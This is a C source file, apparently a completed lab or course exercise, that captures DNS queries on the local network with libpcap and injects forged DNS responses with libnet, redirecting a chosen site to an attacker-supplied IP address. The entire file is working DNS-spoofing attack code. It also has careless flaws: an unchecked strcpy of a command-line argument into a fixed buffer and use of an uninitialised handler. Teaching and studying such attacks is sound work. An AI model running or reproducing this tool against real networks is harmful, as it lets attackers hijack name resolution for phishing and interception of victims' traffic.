
/*****************************************************************
 * Description: This program captures DNS requests,
 *              and reinjects spoofed DNS responses.
 *
 *****************************************************************/
#include "sslattack.h"
#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char **argv) {

  char *spoof_addr;
  char *site_name;
  char temp_site[128];
  char *device;
  char filter[1024];                 /* Capture filter */
  char errbuf[PCAP_ERRBUF_SIZE];     /* Error buffer */
  pcap_t* capdev;                    /* Capturing Device */
  const u_char *packet = NULL;
  struct pcap_pkthdr pcap_hdr;       /* Pcap packet header */
  libnet_t *handler;                 /* Libnet handler */

  int var;

  /* reserve the space for the spoofed packet */
  memset(&spoofpacket, '\0', sizeof(struct sp));

  /* get the spoofing IP address from input */
  spoof_addr = "222.106.38.120";
  site_name = "example.com";

  if (argc >= 2)
    spoof_addr = argv[1];
 
  if (argc >= 3)
    site_name = argv[2];

  if (strncmp(site_name, "www", 3) != 0) {
    strncpy(temp_site, "www.", 4);
    strcpy(temp_site+4, site_name);
    site_name = temp_site; 
  }

  /* get a device to sniff on */
    device = pcap_lookupdev(errbuf);
  
  if (device == NULL) {
    printf("%s\n", errbuf);
    exit(1);
  }

   strcpy(filter, "udp dst port 53");

   /* Setup for sniffering */
   capdev = set_cap_dev(device, filter);

   printf("Sniffering on: %s\n", device);
   printf("Spoofing address: %s\n", spoof_addr);
      
   for (;;)
    {

     packet = pcap_next(capdev, &pcap_hdr);
     
     /* Grab a packet */
     /**** USE: pcap function to grab next packet****/
     
     if (packet == NULL) 
      {
       continue;
      }
	

  //   printf("Packet Length%d\n", pcap_hdr.len);

    
     //printf("Return value: %d", var);
     
    /* If the packet is a DNS query, create a packet */
    if ((analyze_packet(packet, (int)pcap_hdr.caplen, spoof_addr, site_name)) == 1) 
      {
       //  printf("DNS packet found\n");
      // Inject the spoofed DNS response
  //       printf("Device: %s", device);
         spoof_dns(device);
       //  printf("YAY! DNS packet sent\n");
       //  return 1;
      }
    }
   
   return 0;
}


/* Basic setup for packet sniffing */
pcap_t *set_cap_dev (char *device, char *filter) {
  unsigned int network;           /* Filter setting */
  unsigned int netmask;           /* Filter setting */
  struct bpf_program fp;          /* Store compiled filter */
  struct pcap_pkthdr pcap_h;      /* Packet header */
  pcap_t *capdev;                 /* Capturing device */
  char errbuf[PCAP_ERRBUF_SIZE];  /* Error buffer */

  pcap_lookupnet (device, &network, &netmask, errbuf);
  
  /* Open a network device for packet capture */
  if ((capdev = pcap_open_live(device, BUFSIZE, 0, 1000, errbuf)) == NULL) {
    printf("pcap_open_live(): %s\n", errbuf);
    exit(1);
  }

  /* Make sure that we're capturing on an Ethernet device */
  if (pcap_datalink(capdev) != DLT_EN10MB) {
    printf("%s is not an Ethernet\n", device);
    exit(1);
  }
  
  /* Compile the filter expression */
  if (pcap_compile(capdev, &fp, filter, 0, netmask) == -1) {
    printf("Couldn't parse filter %s: %s\n", filter, pcap_geterr(capdev));
    exit(1);
  }

  /* Apply the compiled filter */
  if (pcap_setfilter(capdev, &fp) == -1) {
    printf("Couldn't install filter %s: %s\n", filter, pcap_geterr(capdev));
    exit(1);
  }

  return capdev;
}

/* Analyze a packet and store information */
int analyze_packet(const u_char *packet, int caplen, char *spoof_addr, char *site_name) {
  struct ip *ip;        /* IP header */
  struct udphdr *udp;   /* UDP header */
  struct dnshdr *dns;   /* DNS hdader */
  char *data;           /* Pointer to DNS payload */
  char *data_backup;    /* Original pointer to DNS payload */
  char name[128];       /* Lookup name */
  char name_ext[128];   /* Lookup name */
  u_long rdata;         /* IP addr in network byte order */
  int datalen;          /* Length of DNS payload */
  int c = 1;            /* For name extraction */        
  int i = 0;
  libnet_t *handler;    /* Libnet handler */

  ip = (struct ip *) (packet +offset);
  udp = (struct udphdr *) (packet + offset + LIBNET_IPV4_H);
  dns = (struct dnshdr *) (packet+ offset + LIBNET_IPV4_H + LIBNET_UDP_H);
  data = (char *)(packet + offset + LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H);

  datalen = strlen(data);
  data_backup = data;
 
  memset(name, '\0', sizeof(name));
  
  /* Convert name */  
  if (dn_expand((u_char *)dns, packet + caplen, data, name, sizeof(name)) < 0){
    return;
  }
  
  printf("DNS Request >>> [src]%s:%d\n", inet_ntoa(ip->ip_src), ntohs(udp->source));
  printf("                [dst]%s:%d\n", inet_ntoa(ip->ip_dst), ntohs(udp->dest));
  printf("                [query]%s\n", name);
 
  /* Restore data pointer */  
  data = data_backup;
  
  /* kill the trailing '.' */
  name[datalen-1] = '\0';
  
//printf("DestinationPort: %d\n", ntohs(udp->dest));

  /* We only spoof packets of DNS request */
  if (ntohs(udp->dest) != 53) {
    printf("Destination port is not 53\n");
    return 0;
  }
  
   /* We only deal with query type A */ 
  if (((int)*(data+datalen+2)) != T_A) {
    printf("Query is not type A\n");
    return 0;
    }

  if (strncmp (name, "www", 3) != 0) {
    memset(name_ext, '\0', sizeof(name_ext));
    strncpy(name_ext, "www.", 4);
    strncpy(name_ext+4, name, sizeof(name));
    strncpy(name, name_ext, sizeof(name_ext));
  }

  /* We only spoof packets for the specific site_name */
  if (strncmp(site_name, name, strlen(site_name)) != 0) {
    printf("Requesting site is not %s\n\n", site_name);
  //printf("I'm here");

    return 0;
  }




  /* Save information for the spoofed packet generation */
  strncpy(spoofpacket.query, name, 128);
  spoofpacket.src_address = ip->ip_src.s_addr;
  spoofpacket.dst_address = ip->ip_dst.s_addr;
   spoofpacket.src_port = ntohs(udp->source);
   spoofpacket.dst_port = ntohs(udp->dest);
   spoofpacket.dns_id = dns->id;
   spoofpacket.dns_id = (spoofpacket.dns_id>>8)|(spoofpacket.dns_id<<8);
  spoofpacket.response = spoof_addr;

  /* Convert rdata from char* to unsigned long */
  rdata = libnet_name2addr4(handler, spoofpacket.response, LIBNET_DONT_RESOLVE);
  //printf("Rdata: %d\n", rdata);

  if (rdata == -1) {
    printf("Resolving name failed: %s\n", libnet_geterror(handler));
  }

  /* Payload of the spoofed DNS Response */
  memcpy(spoofpacket.payload, data, datalen + 5);
  memcpy(spoofpacket.payload+datalen+5, "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x04\x00\x04", 12);
  //memcpy(spoofpacket.payload+datalen+5, spoofpacket.response, 12);
  *((u_long *)(spoofpacket.payload+datalen+5+12)) = rdata;
  spoofpacket.payload_size = datalen+17+4;

//u_charsToUChars (spoofpacket.response, x,);
   
//printf("SourcePort: %d\n", udp->source);

  return 1;
}


/* Build the new packet and inject it */
void spoof_dns(char *device)
 {
//  printf("Common Dude!");

  struct  in_addr src, dst, spoof;   /* For printing addresses */
  int     inject_size;               /* Number of bytes of injected packet     */
  int     packet_size;               /* Size of the packet          */
  int     i;                         /* misc                        */
  u_char  *packet;                   /* Packet to be built               */
  libnet_t *handler;                 /* Libnet handler */
  libnet_ptag_t dns, tcp, udp, ip;        /* Libnet ptags */
  char errbuf[LIBNET_ERRBUF_SIZE];   /* Error buffer */

  packet_size = spoofpacket.payload_size + LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H;

  /* Open a raw socket */
  handler = libnet_init(LIBNET_RAW4, device, errbuf);
 
  if (handler == NULL)
   {
    printf("Error opening a socket: %s\n", errbuf);
    exit(1);
   }
  
  /* DNS header construction */
  dns = 0;
  udp = 0;
  tcp = 0;
  ip = 0;
  /*****************************************************/
  /******* USE: libnet to construct DNS header here ****/
  /*****************************************************/
  libnet_build_dnsv4  ( LIBNET_UDP_DNSV4_H, 
  			spoofpacket.dns_id,
  			0x8180,
			1,
  			1,
  			0,
  			0,
 			spoofpacket.payload,		//insert payload
  			spoofpacket.payload_size,	//36	//insert length
  			handler,
  			dns   );
     
  




  if (dns == -1) {
    printf("Building DNS header failed: %s\n", libnet_geterror(handler));
    exit(1);
  }

//  printf("DST PORT: %d\n", spoofpacket.dst_port);
//  printf("SRC PORT: %d\n", spoofpacket.src_port);
  //printf("UDP Data: %d\n", spoofpacket.payload_size);
  /* UDP header construction */
  /*** Use libnet to construct UDP header here **/
  libnet_build_udp   (  spoofpacket.dst_port, 
  			spoofpacket.src_port, 
  			spoofpacket.payload_size + LIBNET_DNS_H + LIBNET_UDP_H, // 36 + 12 + 8
			0,				//insert UDP checksum. have to check later 
  			NULL, 				//insert payload
  			0,		//insert lenghth 
  			handler, 
  			udp  );




  if (udp ==-1) {
    printf("Building UDP header failed: %s\n", libnet_geterror(handler));
    exit(1);
  }
  
  /* IP header construction */
  /*****************************************************/
  /******************* FILL IN *************************/
  /******* USE: libnet to construct IP header here ****/
  /*****************************************************/
  libnet_build_ipv4   (   packet_size, 		//56 + 20
 			  0, 
  			  6888,		//libnet_get_prand (LIBNET_PRu16) 
  			  0, 
			  127, 
 			  IPPROTO_UDP, 
  			  0,				////insert IP checksum value. have to check later 
  			  spoofpacket.dst_address, 
  			  spoofpacket.src_address, 
 			  NULL, 			//insert payload
  			  0, 				//insert length
  			  handler, 
 			  ip   );

	//Remember, all length can be debatable

  if (ip == -1) {
    printf("Building IP header failed: %s\n", libnet_geterror(handler));
    exit(1);
  }

  /* Calculate checksum */
  /****** USE: libnet function to generate checksum*******/
  /*******************************************************/
  
  /*  Inject the packet */
  /*******************************************************/
  inject_size = libnet_write(handler);
//printf("Inject: %d\n", inject_size);

  if (inject_size == -1) 
   {
    printf("Write failed: %s\n", libnet_geterror(handler));
   }
  
  printf("--- Spoofed DNS Response injected ---\n\n");

  /*  Destroy the packet */
  /*******************************************************/
  /**************** USE: libnet_destroy() ****************/
  /*******************************************************/
  libnet_destroy(handler);

}
